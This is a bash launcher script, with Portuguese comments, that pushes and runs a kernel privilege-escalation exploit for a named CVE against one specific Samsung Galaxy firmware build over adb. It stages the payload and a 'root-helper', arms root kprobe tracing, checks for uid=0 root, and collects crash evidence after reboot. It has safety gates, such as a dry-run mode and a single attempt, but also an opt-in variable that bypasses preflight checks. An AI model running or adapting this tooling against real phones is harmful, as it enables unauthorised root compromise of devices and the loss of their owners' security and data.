#!/usr/bin/env bash
# One ZZHL attempt, followed by automatic evidence collection on recovery boot.
set -Eeuo pipefail

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "$script_dir/common.sh"

usage() {
  cat <<'EOF'
Uso: run-zzhl-device.sh --serial SERIAL [--route legacy|p0] [--slide-only] [--output DIR] [--execute]

Sem --execute, mostra o plano sem alterar o aparelho. Com --execute, roda o
payload ZZHL e coleta logs após falha/reboot; nunca relança após reboot.
O launcher de estabilidade força EXPLOIT_ATTEMPTS=1 internamente: nunca há
retry de futex/rtmutex no mesmo boot.

  --serial SERIAL             Serial ADB explícito.
  --route ROTA                legacy (padrão) ou p0; P0 exige `make p0`.
  --slide-only                Executa somente descoberta KASLR; sem trigger.
  --output DIR                Padrão: evidence/zzhl-validation/<UTC>.
  --reboot-wait-seconds N     Espera pelo próximo boot após falha (padrão 900).
  --stability-launcher       Executa o .so ZZHL via launcher.
  --unsafe-p0-trigger        Libera P0 completo após revisão de geometria.
  --execute                   Autoriza staging e uma execução no aparelho.
EOF
}

serial=
output=
execute=0
stability_launcher=0
route=legacy
slide_only=0
unsafe_p0_trigger=0
reboot_wait_seconds=900
while [[ $# -gt 0 ]]; do
  case "$1" in
    --serial) serial="${2:?serial ausente}"; shift 2 ;;
    --route) route="${2:?rota ausente}"; shift 2 ;;
    --slide-only) slide_only=1; shift ;;
    --unsafe-p0-trigger) unsafe_p0_trigger=1; shift ;;
    --output) output="${2:?diretório ausente}"; shift 2 ;;
    --reboot-wait-seconds) reboot_wait_seconds="${2:?segundos ausentes}"; shift 2 ;;
    --execute) execute=1; shift ;;
    --stability-launcher) stability_launcher=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "opção desconhecida: $1" ;;
  esac
done

[[ -n "$serial" ]] || die "--serial é obrigatório"
[[ "$route" == legacy || "$route" == p0 ]] || die "--route deve ser legacy ou p0"
[[ "$reboot_wait_seconds" =~ ^[0-9]+$ ]] &&
  (( reboot_wait_seconds >= 30 )) || die "--reboot-wait-seconds deve ser >= 30"
need_cmd "${ADB:-adb}"
need_cmd sha256sum
need_cmd python3
need_cmd tee
need_cmd timeout
require_device "$serial"

payload="$repo_dir/build/app_main"
launcher="$repo_dir/../app/src/main/assets/stability-launcher"
if (( stability_launcher )); then
  payload="$repo_dir/build/oss_clone_payload.so"
  [[ -f "$launcher" ]] || die "launcher ausente"
fi
if [[ "$route" == p0 ]]; then
  (( stability_launcher )) || die "rota p0 requer --stability-launcher"
  payload="$repo_dir/build/oss_clone_p0_zzhl.so"
  launcher="$repo_dir/build/stability-launcher-zzhl"
fi
helper="$repo_dir/../build/dm3q-S918BXXUAZZHL/cve-2026-43499-root"
remote=/data/local/tmp/oss-clone-zzhl
[[ -f "$payload" && -f "$helper" ]] || die "payload ou helper ZZHL ausente"
fingerprint="$(adb_shell "$serial" getprop ro.build.fingerprint | strip_cr)"
model="$(adb_shell "$serial" getprop ro.product.model | strip_cr)"
device="$(adb_shell "$serial" getprop ro.product.device | strip_cr)"
kernel="$(adb_shell "$serial" uname -r | strip_cr)"
expected_fingerprint='samsung/dm3qxxx/dm3q:17/CP2A.260605.016/S918BXXUAZZHL:user/release-keys'
expected_kernel='5.15.197-android13-8-34343818-abS918BXXUAZZHL'
[[ "$model" == SM-S918B && "$device" == dm3q &&
   "$fingerprint" == "$expected_fingerprint" &&
   "$kernel" == "$expected_kernel" ]] || die "device não corresponde ao ZZHL"
boot_before="$(adb_shell "$serial" cat /proc/sys/kernel/random/boot_id | strip_cr)"
old_lastkmsg="$(adb_shell "$serial" \
  'ls -t /data/log/dumpstate_lastkmsg_*.log.gz 2>/dev/null | head -n 1' \
  2>/dev/null | strip_cr || true)"
collector_args=()
[[ -z "$old_lastkmsg" ]] || collector_args=(--previous-lastkmsg "$old_lastkmsg")
payload_sha="$(sha256sum "$payload" | awk '{print $1}')"
helper_sha="$(sha256sum "$helper" | awk '{print $1}')"
launcher_sha=
if (( stability_launcher )); then
  launcher_sha="$(sha256sum "$launcher" | awk '{print $1}')"
fi
output="${output:-$repo_dir/evidence/zzhl-validation/$(timestamp_utc)}"

if (( ! execute )); then
  printf 'ZZHL device=%s boot=%s\npayload=%s sha256=%s\nhelper=%s sha256=%s\noutput=%s\n' \
    "$serial" "$boot_before" "$payload" "$payload_sha" "$helper" \
    "$helper_sha" "$output"
  printf 'Execute com --execute; sem relançamento após reboot.\n'
  if (( stability_launcher )); then
    printf 'launcher=%s sha256=%s\n' "$launcher" "$launcher_sha"
  fi
  exit 0
fi

# P0 entrou em rb_erase() com nó filho inválido no ZZHL (evidence
# p0-full-4b1ca5c9). Não permitir repetir o trigger mutante por engano.
if [[ "$route" == p0 && "$slide_only" == 0 && "$unsafe_p0_trigger" == 0 ]]; then
  die "P0 completo bloqueado: geometria rt_mutex/RB inválida; use --slide-only ou --unsafe-p0-trigger após correção"
fi

[[ ! -e "$output" ]] || die "diretório de evidência já existe: $output"
mkdir -p "$output"
"$script_dir/preflight-device.sh" --serial "$serial" \
  --expect-build S918BXXUAZZHL --require-clean \
  --output "$output/preflight-before.json"
printf '%s\n' "$old_lastkmsg" > "$output/lastkmsg-before.txt"
printf '%s  %s\n%s  %s\n' "$payload_sha" "$payload" "$helper_sha" "$helper" \
  > "$output/host-artifacts.sha256"
if (( stability_launcher )); then
  printf '%s  %s\n' "$launcher_sha" "$launcher" \
    >> "$output/host-artifacts.sha256"
fi

adb_bin="${ADB:-adb}"
"$adb_bin" -s "$serial" shell "mkdir -p '$remote'"
remote_payload="$remote/app_main"
if (( stability_launcher )); then
  remote_payload="$remote/oss_clone_payload.so"
fi
if [[ "$route" == p0 ]]; then
  remote_payload="$remote/oss_clone_p0_zzhl.so"
fi
"$adb_bin" -s "$serial" push "$payload" "$remote_payload"
"$adb_bin" -s "$serial" push "$helper" "$remote/root-helper"
if (( stability_launcher )); then
  "$adb_bin" -s "$serial" push "$launcher" "$remote/stability-launcher"
fi
"$adb_bin" -s "$serial" shell \
  "chmod 755 '$remote_payload' '$remote/root-helper'"
if (( stability_launcher )); then
  "$adb_bin" -s "$serial" shell \
    "chmod 755 '$remote/stability-launcher'"
fi
remote_hashes="$(adb_shell "$serial" \
  "sha256sum '$remote_payload' '$remote/root-helper'" | strip_cr)"
[[ "$remote_hashes" == *"$payload_sha  $remote_payload"* &&
   "$remote_hashes" == *"$helper_sha  $remote/root-helper"* ]] ||
  die "hash remoto divergente; payload não executado"
if (( stability_launcher )); then
  remote_extra_hashes="$(adb_shell "$serial" \
    "sha256sum '$remote/stability-launcher'" | strip_cr)"
  [[ "$remote_extra_hashes" == *"$launcher_sha  $remote/stability-launcher"* ]] ||
    die "hash remoto divergente; launcher não executado"
fi

note "executando ZZHL; log: $output/device.log"
root_witness_env=
root_id="$(adb_shell "$serial" 'su -c id' 2>/dev/null | strip_cr || true)"
if [[ "$root_id" == *'uid=0(root)'* ]]; then
  note "armando witness root task->pi_blocked_on->lock"
  "$adb_bin" -s "$serial" shell "su -c '
    echo 0 > /sys/kernel/tracing/tracing_on
    echo \"-:rmg_futex_witness\" >> /sys/kernel/tracing/kprobe_events 2>/dev/null || true
    echo \"p:rmg_futex_witness rt_mutex_adjust_pi task=%x0 waiter=+0x8b0(%x0):u64 lock=+0x38(+0x8b0(%x0)):u64 waiter_task=+0x30(+0x8b0(%x0)):u64 task_pid=+0x5d8(%x0):u32\" >> /sys/kernel/tracing/kprobe_events
    echo 1 > /sys/kernel/tracing/events/kprobes/rmg_futex_witness/enable
    echo > /sys/kernel/tracing/trace
    echo 1 > /sys/kernel/tracing/tracing_on
  '" || die "não foi possível armar witness futex root"
  root_witness_env="OSS_ROOT_FUTEX_WITNESS=1 "
fi
set +e
# Opt-in passthrough of the unsafe preflight bypass (host env -> device payload)
# for a single instrumented validation run. Unset by default.
bypass_env=""
if [[ -n "${OSS_UNSAFE_BYPASS_PREFLIGHT:-}" ]]; then
  bypass_env="OSS_UNSAFE_BYPASS_PREFLIGHT=1 "
fi
if (( stability_launcher )); then
  "$adb_bin" -s "$serial" shell \
    "EXPLOIT_ATTEMPTS=1 FUTEX_WAIT_SEC=8 RMG_TRACE_FILE=1 ${root_witness_env}${bypass_env}$([[ $slide_only == 1 ]] && printf 'SLIDE_ONLY=1 ')'$remote/stability-launcher' --payload '$remote_payload' --helper '$remote/root-helper'" \
    2>&1 | tee "$output/device.log"
else
  "$adb_bin" -s "$serial" shell \
    "EXPLOIT_ATTEMPTS=1 FUTEX_WAIT_SEC=8 RMG_TRACE_FILE=1 ${root_witness_env}${bypass_env}CVE43499_ROOT_HELPER='$remote/root-helper' '$remote/app_main'" \
    2>&1 | tee "$output/device.log"
fi
run_rc=${PIPESTATUS[0]}
set -e
if [[ -n "$root_witness_env" ]]; then
  "$adb_bin" -s "$serial" shell "su -c '
    echo 0 > /sys/kernel/tracing/tracing_on
    echo 0 > /sys/kernel/tracing/events/kprobes/rmg_futex_witness/enable 2>/dev/null || true
    echo \"-:rmg_futex_witness\" >> /sys/kernel/tracing/kprobe_events 2>/dev/null || true
  '" >/dev/null 2>&1 || true
fi
printf '%s\n' "$run_rc" > "$output/adb-exit-code.txt"

read_boot_id() {
  timeout 10 "$adb_bin" -s "$serial" shell \
    cat /proc/sys/kernel/random/boot_id 2>/dev/null |
    strip_cr || true
}

boot_after="$(read_boot_id)"
root_proof=
recovery_collection=not_needed
if [[ "$boot_after" == "$boot_before" &&
      $(grep -Fc '[safe-stop]' "$output/device.log" || true) -gt 0 ]]; then
  result=blocked_safe
  note "payload bloqueado antes de groom/trigger; coletando evidência sem esperar reboot"
  "$script_dir/collect-forensics.sh" --serial "$serial" \
    --output "$output/immediate" "${collector_args[@]}" || true
elif (( slide_only )) && [[ "$boot_after" == "$boot_before" &&
      "$run_rc" == 0 &&
      $(grep -Fc 'slide-only done' "$output/device.log" || true) -gt 0 ]]; then
  result=pass_slide
  note "slide-only confirmado no mesmo boot; coletando evidência sem esperar reboot"
  "$script_dir/collect-forensics.sh" --serial "$serial" \
    --output "$output/postrun" "${collector_args[@]}" || true
elif [[ "$boot_after" == "$boot_before" && "$run_rc" == 0 ]]; then
  root_proof="$(timeout 10 "$adb_bin" -s "$serial" shell \
    "$remote/root-helper -c 'id'" \
    2>/dev/null | strip_cr || true)"
  printf '%s\n' "$root_proof" > "$output/root-proof.txt"
fi
if [[ "${result:-}" == blocked_safe || "${result:-}" == pass_slide ]]; then
  :
elif [[ "$boot_after" == "$boot_before" && "$root_proof" == *'uid=0(root)'* ]]; then
  note "root confirmado no mesmo boot; coletando estado final"
  "$script_dir/collect-forensics.sh" --serial "$serial" \
    --output "$output/postrun" "${collector_args[@]}" || true
  result=pass_root
else
  result=failed_no_reboot
  recovery_collection=reboot_not_observed
  if [[ "$boot_after" == "$boot_before" ]]; then
    "$script_dir/collect-forensics.sh" --serial "$serial" \
      --output "$output/immediate" "${collector_args[@]}" || true
  fi
  note "falha ou desconexão; aguardando próximo boot por até ${reboot_wait_seconds}s"
  deadline=$((SECONDS + reboot_wait_seconds))
  while (( SECONDS < deadline )); do
    boot_after="$(read_boot_id)"
    if [[ -n "$boot_after" && "$boot_after" != "$boot_before" ]]; then
      result=failed_rebooted
      break
    fi
    sleep 3
  done
  if [[ "$result" == failed_rebooted ]]; then
    deadline=$((SECONDS + 180))
    while (( SECONDS < deadline )); do
      completed="$(timeout 10 "$adb_bin" -s "$serial" shell \
        getprop sys.boot_completed \
        2>/dev/null | strip_cr || true)"
      [[ "$completed" == 1 ]] && break
      sleep 3
    done
    # Samsung's last_kmsg archive may appear after ADB and boot_completed.
    deadline=$((SECONDS + 90))
    while (( SECONDS < deadline )); do
      current_lastkmsg="$(timeout 10 "$adb_bin" -s "$serial" shell \
        'ls -t /data/log/dumpstate_lastkmsg_*.log.gz 2>/dev/null | head -n 1' \
        2>/dev/null | strip_cr || true)"
      [[ -n "$current_lastkmsg" && "$current_lastkmsg" != "$old_lastkmsg" ]] && break
      sleep 3
    done
    recovery_collection=failed
    for collection_attempt in 1 2 3 4 5 6; do
      if "$script_dir/collect-forensics.sh" --serial "$serial" \
          --output "$output/recovery" "${collector_args[@]}"; then
        recovery_collection=complete
        break
      fi
      note "coleta após reboot falhou ($collection_attempt/6); novo ADB em 5s"
      sleep 5
    done
  fi
fi

lastkmsg_status=not_collected
if [[ -f "$output/recovery/samsung-lastkmsg-status.txt" ]]; then
  lastkmsg_status="$(< "$output/recovery/samsung-lastkmsg-status.txt")"
fi
python3 - "$output/summary.json" "$serial" "$boot_before" \
  "$boot_after" "$run_rc" "$result" "$payload_sha" "$helper_sha" \
  "$recovery_collection" "$lastkmsg_status" <<'PY'
import json, pathlib, sys
path = pathlib.Path(sys.argv[1])
data = dict(zip(
    ("serial", "boot_before", "boot_after", "adb_exit_code", "result",
     "payload_sha256", "helper_sha256", "recovery_collection",
     "lastkmsg_status"), sys.argv[2:]
))
data["adb_exit_code"] = int(data["adb_exit_code"])
path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")
PY
note "resultado=$result evidência=$output"
[[ "$result" == pass_root || "$result" == pass_slide ]]
